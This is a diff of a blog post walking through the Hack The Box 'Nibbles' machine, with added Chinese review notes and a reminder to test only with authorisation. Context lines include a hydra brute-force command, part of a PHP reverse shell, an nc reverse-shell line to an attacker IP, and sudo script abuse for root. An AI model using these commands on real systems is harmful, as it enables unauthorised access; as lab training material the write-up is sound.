@@ -6,9 +6,10 @@ cover: "/img/post-covers/nibbles-hack-the-box-771374afbf.jpg"
 tags: [安全, 渗透测试, HTB]
 categories: [htb]
 date: "2019-03-17"
+lastmod: "2026-08-08"
 ---
 
-![Ae0G8g.png](https://s2.ax1x.com/2019/03/17/Ae0G8g.png)
+![Ae0G8g.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/47a5f56710b4.png)
 
 ## Introduction
 
@@ -23,7 +24,7 @@ Firstly, detect the open ports:
 nmap -sT -p- --min-rate 10000 -oA openports 10.10.10.75
 ```
 
-![Ae19BQ.png](https://s2.ax1x.com/2019/03/17/Ae19BQ.png)
+![Ae19BQ.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/cc64bb41eafd.png)
 
 There are not too many open ports, just `80` and `22`. Detect the detailed services of the open ports:
 
@@ -31,7 +32,7 @@ There are not too many open ports, just `80` and `22`. Detect the detailed servi
 nmap -sC -sV -oA services 10.10.10.75
 ```
 
-![Ae1E90.png](https://s2.ax1x.com/2019/03/17/Ae1E90.png)
+![Ae1E90.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/ebe33e24e983.png)
 
 Nothing special found. The only clue may be the open port of `80`. To be honest, the box with less open ports is easier in general.
 
@@ -41,11 +42,11 @@ Nothing special found. The only clue may be the open port of `80`. To be honest,
 
 Access to `http://10.10.10.75`, just a web page of `hello world`.
 
-![Ae0qsA.png](https://s2.ax1x.com/2019/03/17/Ae0qsA.png)
+![Ae0qsA.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/5b9c2d80261d.png)
 
 With the first sight, have not found anything special. Open the inspector, a comment can be found. Obviously, `nibbleblog` is quite important to us. Access to `http://10.10.10.75/nibbleblog`:
 
-![Ae0XZt.png](https://s2.ax1x.com/2019/03/17/Ae0XZt.png)
+![Ae0XZt.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/f945c2e25684.png)
 
 It seems to be a blog demo. Try to access to each hyperlink in the web page, find nothing special. Try to use nikto to explore:
 
@@ -53,7 +54,7 @@ It seems to be a blog demo. Try to access to each hyperlink in the web page, fin
 nikto -host http://10.10.10.75/nibbleblog/
 ```
 
-![AeYklt.png](https://s2.ax1x.com/2019/03/17/AeYklt.png)
+![AeYklt.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/f30066345eb7.png)
 
 `[nibbleblog](http://www.nibbleblog.com/)`  is an open source blog system which has been widely used. From the above screenshot, some interesting links can be found. And also try to brute force with `gobuster`:
 
@@ -63,21 +64,21 @@ gobuster -u http://10.10.10.75/nibbleblog/ -w /usr/share/dirbuster/wordlists/dir
 
 Similarly, the directory of `nibbleblog` can be found, just like admin, content, etc. Open the README of the blog:
 
-![AeYynK.png](https://s2.ax1x.com/2019/03/17/AeYynK.png)
+![AeYynK.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/5f4d55418172.png)
 
 The version is `4.0.3`. Google with `nibbleblog 4.0.3 exploit`. Find a [report](https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html) to talk about the exploit of nibbleblog of `4.0.3`.
 
-![AeYRtH.png](https://s2.ax1x.com/2019/03/17/AeYRtH.png)
+![AeYRtH.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/02391d3eb4dd.png)
 
 The research report is detailed. But there is a precondition that you have to obtain admin credentials. Access to login page: `http://10.10.10.75/nibbleblog/admin.php`.
 
-[![AeY5ct.png](https://s2.ax1x.com/2019/03/17/AeY5ct.png)](https://imgchr.com/i/AeY5ct)
+![AeY5ct.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/a6399ea1bb93.png)
 
 Try the password of `123456` and `admin`. Both are not correct. I have even tried to use hydra:
 
 `hydra -l admin -P /usr/share/wordlist/rockyou.txt -vV -f -t 2 10.10.10.75 http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^:login_error"`
 
-![AetpuV.png](https://s2.ax1x.com/2019/03/17/AetpuV.png)
+![AetpuV.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/999a82a4ffe9.png)
 
 The hydra result shows that the password is `123456`. But it is not correct. I doubt it has something with the blacklist of `nibbleblog`. Whatever, try to figure out the password. Try `nibbles`. Wow, we are in. You should try every password as more as possible. 
 
@@ -239,19 +240,17 @@ function printit ($string) {
 
 Accomplish the last step, get the user shell!
 
-![AetbKx.png](https://s2.ax1x.com/2019/03/17/AetbKx.png)
-
-![AeNAZ8.png](https://s2.ax1x.com/2019/03/17/AeNAZ8.png)
+![AetbKx.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/5380baf38eed.png)
 
 ## Privilege escalation
 
 The next step is to get the root shell. Try to check the kernel of the linux:
 
-![AeNuzn.png](https://s2.ax1x.com/2019/03/17/AeNuzn.png)
+![AeNAZ8.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/6fbf828a7774.png)
 
 The kernel seems quite fresh. It may be hard to find the kernel exploit. Try to check the sudo permission of nibbler: `sudo -l`.
 
-![AeNrdO.png](https://s2.ax1x.com/2019/03/17/AeNrdO.png)
+![AeNuzn.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/abc6756263e3.png)
 
 Just as expected, find a file `monitor.sh` with root permission. Try to read the file with:
 
@@ -259,7 +258,7 @@ Just as expected, find a file `monitor.sh` with root permission. Try to read the
 cat /home/nibbler/personal/stuff/monitor.sh
 ```
 
-![AeUA61.png](https://s2.ax1x.com/2019/03/17/AeUA61.png)
+![AeNrdO.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/e31074d67b3b.png)
 
 The file seems to be a bash script with several tasks. There is no need to understand the usage of the file. We can just modify the script to obtain root shell. So the script should be modified. As it is not convenient to modify the file in the victim machine directly. `Nc` can be used to send and receive file.
 
@@ -285,9 +284,7 @@ nc -e 10.10.16.44 1111
 
 Try to set `nc` listen to `1111`:
 
-![AeaECQ.png](https://s2.ax1x.com/2019/03/17/AeaECQ.png)
-
-
+![AeUA61.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/d8b6d9829d09.png)
 
 There's a problem with the `nc` in the victim machine. `e` option is invalid in the victim machine. May there are some solutions, but I turn to other reverse shell methods right away.
 
@@ -309,10 +306,40 @@ sudo ./monitor.sh
 
 Here is the root.
 
-![AewPfg.png](https://s2.ax1x.com/2019/03/17/AewPfg.png)
+![AeaECQ.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/00db624c19dd.png)
 
  
 
 ## Conclusion
 
 To be honest, the most difficult challenge of this box is to guess the password of admin of `nibbleblog`. The known vulnerability is not difficult to utilize. To obtain root shell, there are some methods to try. Some specific method cannot be utilized directly. You can try another method. Try harder!
+
+
+## 练习收获清单
+
+- 目录枚举发现隐藏管理端  
+- 弱口令 / 默认凭据意识  
+- 文件上传或模板注入类初始访问  
+- 权限提升前的本机枚举顺序  
+
+## 小结
+
+Nibbles 适合练「Web 入口 + 基础提权」节奏。把每一次枚举命令的目的写下来，形成自己的检查表。
+
+
+## 复盘问题
+
+- 哪条枚举路径浪费时间最多？  
+- 哪个假设是错的？  
+- 若重来，字典与词表如何调整？  
+
+写完 flags 再写三段复盘，进步会更快。
+
+
+## 延伸阅读与实践
+
+把文章里的命令和配置放到自己的实验环境跑一遍，比只看结论更重要。建议同步记录：环境版本、失败现象、最终生效的配置。下次遇到同类问题时，检索自己的笔记往往比搜引擎更快。
+
+若该主题涉及安全测试，请仅在明确授权的系统或官方靶场中操作，并保留测试范围与时间窗记录，避免对生产造成误伤。
+
+对团队分享时，用「问题—影响—修复—验证」四段结构复述，有助于把个人经验沉淀为组织能力。
